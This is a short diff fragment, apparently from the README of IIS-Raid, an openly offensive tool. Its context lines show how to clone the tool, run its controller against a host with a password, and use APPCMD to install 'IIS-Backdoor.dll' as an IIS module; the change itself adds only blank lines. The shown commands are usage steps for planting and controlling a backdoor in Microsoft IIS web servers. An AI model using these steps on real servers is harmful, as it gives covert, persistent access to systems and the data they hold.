@@ -16,3 +16,5 @@ $ git clone https://github.com/0x09AL/IIS-Raid
 $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
 C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
 ```
+
+
